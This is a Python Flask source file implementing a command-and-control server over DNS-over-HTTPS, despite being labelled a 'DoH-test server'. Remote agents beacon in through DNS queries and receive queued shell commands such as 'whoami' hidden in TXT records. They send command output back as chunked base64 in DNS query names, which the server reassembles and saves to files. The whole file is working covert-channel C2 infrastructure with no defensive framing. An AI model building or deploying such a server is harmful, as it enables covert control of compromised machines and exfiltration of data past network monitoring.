#!/usr/bin/env python3
"""
flask_doh_server.py
DoH-test server (updated):
 - Accepts beacon + chunk uploads via /dns-query
 - Queues commands via POST /commands (single or list)
 - Automatically reassembles complete chunk-sets (seq=1..tot) per session,
   decodes base64 and writes outputs to files in `responses/`
 - After saving, removes those chunks from memory to avoid mixing outputs.
"""
import base64
import json
import logging
import argparse
import threading
import os
from flask import Flask, request, Response, jsonify
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, RCODE, TXT
import time
import re
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

# in-memory stores
queued_commands = {}     # session -> [cmd1, cmd2, ...]
responses = {}           # session -> list of (seq, tot, chunk_raw)
last_seen = {}
resp_counters = {}       # session -> integer (how many saved responses so far)
lock = threading.Lock()

# ensure responses folder exists
os.makedirs("responses", exist_ok=True)

# helpers
def b64url_decode(s):
    s = s.encode() if isinstance(s, str) else s
    rem = len(s) % 4
    if rem:
        s += b'=' * (4 - rem)
    return base64.urlsafe_b64decode(s)

def parse_dns_wire_param(b64url_str):
    try:
        data = b64url_decode(b64url_str)
        dns = DNSRecord.parse(data)
        return dns
    except Exception as e:
        logging.warning("Failed to parse DNS wire: %s", e)
        return None

def build_dns_response(request_dns: DNSRecord, txt_payload: str = None, rcode=RCODE.NXDOMAIN):
    header = DNSHeader(id=request_dns.header.id, qr=1, aa=1)
    reply = DNSRecord(header, q=request_dns.q)
    if txt_payload is not None:
        reply.add_answer(RR(
            rname=request_dns.q.qname,
            rtype=QTYPE.TXT,
            rclass=1,
            ttl=60,
            rdata=TXT(txt_payload)
        ))
        reply.header.rcode = RCODE.NOERROR
    else:
        reply.header.rcode = rcode
    packed = reply.pack()
    return bytes(packed)

qname_to_str = lambda qname: str(qname).rstrip('.')

client_chunk_re = re.compile(
    r"^(?P<seq>\d+)-(?P<tot>\d+)\.(?P<session>[a-z0-9]+)\.(?P<chunk>[^.]+)\.(?P<domain>.+)$",
    re.IGNORECASE
)
beacon_re = re.compile(r"^(?:beacon\.)?(?P<session>[a-z0-9]+)\.(?P<domain>.+)$", re.IGNORECASE)

def try_reassemble(session):
    """
    Check if in responses[session] there exists a complete set for some 'tot' value.
    If found: sort by seq, combine, pad base64, decode, write to file, remove used chunks.
    Return list of saved filenames.
    """
    saved_files = []
    with lock:
        if session not in responses or len(responses[session]) == 0:
            return saved_files
        # group by tot
        by_tot = {}
        for seq, tot, chunk in responses[session]:
            by_tot.setdefault(tot, []).append((seq, chunk))
        # check each tot for completeness
        for tot, items in list(by_tot.items()):
            seqs = [s for (s, _) in items]
            if set(seqs) >= set(range(1, tot+1)):
                # we have full set for this tot
                # collect chunks in order
                seq_map = {s: c for (s, c) in items}
                chunks_ordered = [seq_map[i] for i in range(1, tot+1)]
                combined = "".join(chunks_ordered)
                # pad base64 (agent removes '=')
                rem = len(combined) % 4
                if rem:
                    combined_padded = combined + ("=" * (4 - rem))
                else:
                    combined_padded = combined
                try:
                    decoded_bytes = base64.b64decode(combined_padded)
                    decoded_text = decoded_bytes.decode('utf-8', errors='ignore')
                except Exception as e:
                    decoded_text = None
                # filename
                resp_counters.setdefault(session, 0)
                resp_counters[session] += 1
                ts = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
                fname = f"responses/{session}_{ts}_resp{resp_counters[session]}.txt"
                # write decoded (or raw) to file
                try:
                    with open(fname, "wb") as f:
                        if decoded_text is not None:
                            f.write(decoded_text.encode('utf-8'))
                        else:
                            # write raw bytes if decode failed
                            f.write(decoded_bytes if 'decoded_bytes' in locals() else combined.encode('utf-8'))
                    logging.info("Saved reassembled response for session=%s tot=%d -> %s", session, tot, fname)
                    saved_files.append(fname)
                except Exception as e:
                    logging.exception("Failed to write response file: %s", e)
                # remove used chunks from responses[session]
                remaining = [tup for tup in responses[session] if tup[1] != chunk and (tup[1] not in [c for (_, c) in items])]
                # simpler: remove items that match seq/tot pairs we used
                used_set = set((i, tot) for i in range(1, tot+1))
                new_list = [tup for tup in responses[session] if (tup[0], tup[1]) not in used_set]
                responses[session] = new_list
        return saved_files

@app.route('/dns-query', methods=['GET', 'POST'])
def doh_query():
    try:
        if request.method == 'GET':
            b64 = request.args.get('dns', None)
            if not b64:
                return Response("Missing dns param", status=400)
            dnsreq = parse_dns_wire_param(b64)
        else:
            data = request.get_data()
            try:
                dnsreq = DNSRecord.parse(data)
            except Exception as e:
                logging.warning("POST parse failed: %s", e)
                return Response("Invalid DNS wire", status=400)

        if dnsreq is None:
            return Response("Invalid DNS", status=400)

        q = dnsreq.q
        qname_str = qname_to_str(q.qname)
        qtype = QTYPE[q.qtype]
        client_ip = request.remote_addr
        logging.info("DoH query from %s q=%s type=%s", client_ip, qname_str, qtype)
        last_seen[qname_str] = time.time()

        # client chunk upload
        m = client_chunk_re.match(qname_str)
        if m:
            seq = int(m.group('seq'))
            tot = int(m.group('tot'))
            session = m.group('session').lower()
            chunk_label = m.group('chunk')
            with lock:
                responses.setdefault(session, []).append((seq, tot, chunk_label))
                last_seen[session] = time.time()
            logging.info("Received chunk session=%s seq=%d/%d len=%d", session, seq, tot, len(chunk_label))
            # attempt reassembly right away
            saved = try_reassemble(session)
            if saved:
                logging.info("Reassembled and saved files: %s", saved)
            resp_wire = build_dns_response(dnsreq, txt_payload=None, rcode=RCODE.NOERROR)
            return Response(resp_wire, content_type='application/dns-message')

        # beacon (agent asking for command)
        m2 = beacon_re.match(qname_str)
        if m2:
            session = m2.group('session').lower()
            with lock:
                queue = queued_commands.get(session, [])
                if queue:
                    cmd = queue.pop(0)
                    b64cmd = base64.b64encode(cmd.encode('utf-8')).decode('ascii')
                    logging.info("Delivering command to session=%s cmd=%s", session, cmd)
                    resp_wire = build_dns_response(dnsreq, txt_payload=b64cmd, rcode=RCODE.NOERROR)
                    return Response(resp_wire, content_type='application/dns-message')
                else:
                    resp_wire = build_dns_response(dnsreq, txt_payload=None, rcode=RCODE.NOERROR)
                    return Response(resp_wire, content_type='application/dns-message')

        resp_wire = build_dns_response(dnsreq, txt_payload=None, rcode=RCODE.NXDOMAIN)
        return Response(resp_wire, content_type='application/dns-message')
    except Exception as e:
        logging.exception("Unhandled error in doh_query")
        return Response("internal error", status=500)

@app.route('/commands', methods=['POST'])
def add_command():
    """
    Accept either:
      { "session": "cmpjgd", "command": "whoami" }
    OR:
      { "session": "cmpjgd", "commands": ["whoami", "uname -a", "ls -la"] }
    """
    data = request.get_json(force=True)
    session = data.get('session')
    if not session:
        return jsonify({"ok": False, "error": "session required"}), 400
    session = session.lower()
    cmds = []
    if 'command' in data and data.get('command'):
        cmds.append(data.get('command'))
    if 'commands' in data and isinstance(data.get('commands'), list):
        cmds.extend([c for c in data.get('commands') if isinstance(c, str)])
    if not cmds:
        return jsonify({"ok": False, "error": "no command(s) provided"}), 400
    with lock:
        queued_commands.setdefault(session, []).extend(cmds)
    logging.info("Queued %d command(s) for session=%s", len(cmds), session)
    return jsonify({"ok": True, "queued_for": session, "count": len(cmds)})

@app.route('/status', methods=['GET'])
def status():
    with lock:
        return jsonify({
            "queued_commands": {k: len(v) for k,v in queued_commands.items()},
            "received_responses": {k: len(v) for k,v in responses.items()},
            "last_seen": {k: v for k,v in last_seen.items()}
        })

@app.route('/responses/<session>', methods=['GET'])
def get_response(session):
    session = session.lower()
    with lock:
        chunks = responses.get(session, [])
    if not chunks:
        return jsonify({"ok": False, "error": "no chunks for session"}), 404
    chunks_sorted = sorted(chunks, key=lambda x: (x[1], x[0]))  # sort by tot then seq
    combined = "".join([c for (_, _, c) in chunks_sorted])
    try:
        rem = len(combined) % 4
        combined_padded = combined + ("=" * (4 - rem)) if rem else combined
        decoded = base64.b64decode(combined_padded).decode('utf-8', errors='ignore')
        return jsonify({"ok": True, "session": session, "decoded": decoded, "raw_combined": combined})
    except Exception as e:
        return jsonify({"ok": False, "error": "decode failed", "raw_combined": combined, "exception": str(e)}), 500

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=8443)
    args = parser.parse_args()
    logging.info("Starting DoH-test server on https://%s:%d (dev TLS)", args.host, args.port)
    app.run(host=args.host, port=args.port, ssl_context='adhoc')
